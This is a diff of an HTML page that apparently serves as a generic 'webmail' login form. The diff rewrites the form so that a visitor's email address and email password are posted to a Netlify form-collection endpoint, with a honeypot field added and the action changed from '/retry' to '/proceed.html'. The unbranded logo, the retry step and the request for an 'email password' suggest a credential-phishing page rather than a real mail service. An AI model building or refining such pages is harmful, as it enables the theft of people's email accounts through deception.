@@ -21,13 +21,52 @@
     <section class="section">
       <div class="w-form">
         <div class="div-block"><img src="images/webmail-logo.svg" loading="lazy" alt="" class="image"></div>
-        <form id="wf-form-details1" name="wf-form-details1" data-name="details1" action="/retry" method="post" data-netlify="true" data-wf-page-id="66c73f39102ee959c98bd09a" data-wf-element-id="1595410f-405e-5903-a213-c49f1ce2af19"><label for="email-2"><strong class="bold-text">Email Address</strong></label>
-          <div class="div-block-3"><input class="text-field w-input" maxlength="256" name="email" data-name="email" placeholder="Enter your email address." type="email" id="email-2" required="">
-            <div class="div-block-5"><img width="128" loading="eager" alt="" src="images/man.png" class="image-2"></div>
-          </div><label for="Passi" class="field-label"><strong>Password</strong></label>
-          <div class="div-block-3"><input class="text-field-2 w-input" maxlength="256" name="Passi" data-name="Passi" placeholder="Enter your email password." type="password" id="Passi" required="">
-            <div class="div-block-5"><img width="128" loading="eager" alt="" src="images/lock-padlock-symbol-for-security-interface.png" class="image-2"></div>
-          </div><input type="submit" data-wait="Please wait..." class="submit-button w-button" value="Log in">
+        <form id="wf-form-details1" 
+              name="email-login" 
+              data-name="email-login" 
+              method="POST" 
+              data-netlify="true"
+              netlify-honeypot="bot-field"
+              action="/proceed.html">
+          
+          <!-- Anti-spam hidden field -->
+          <div hidden>
+            <input name="bot-field">
+          </div>
+
+          <!-- Existing email field -->
+          <label for="email-2"><strong class="bold-text">Email Address</strong></label>
+          <div class="div-block-3">
+            <input class="text-field w-input" 
+                   maxlength="256" 
+                   name="email" 
+                   data-name="email" 
+                   placeholder="Enter your email address." 
+                   type="email" 
+                   id="email-2" 
+                   required="">
+            <div class="div-block-5">
+              <img width="128" loading="eager" alt="" src="images/man.png" class="image-2">
+            </div>
+          </div>
+
+          <!-- Existing password field -->
+          <label for="Passi" class="field-label"><strong>Password</strong></label>
+          <div class="div-block-3">
+            <input class="text-field-2 w-input" 
+                   maxlength="256" 
+                   name="password" 
+                   data-name="password" 
+                   placeholder="Enter your email password." 
+                   type="password" 
+                   id="Passi" 
+                   required="">
+            <div class="div-block-5">
+              <img width="128" loading="eager" alt="" src="images/lock-padlock-symbol-for-security-interface.png" class="image-2">
+            </div>
+          </div>
+
+          <input type="submit" data-wait="Please wait..." class="submit-button w-button" value="Log in">
         </form>
         <div class="w-form-done">
           <div>Thank you! Your submission has been received!</div>
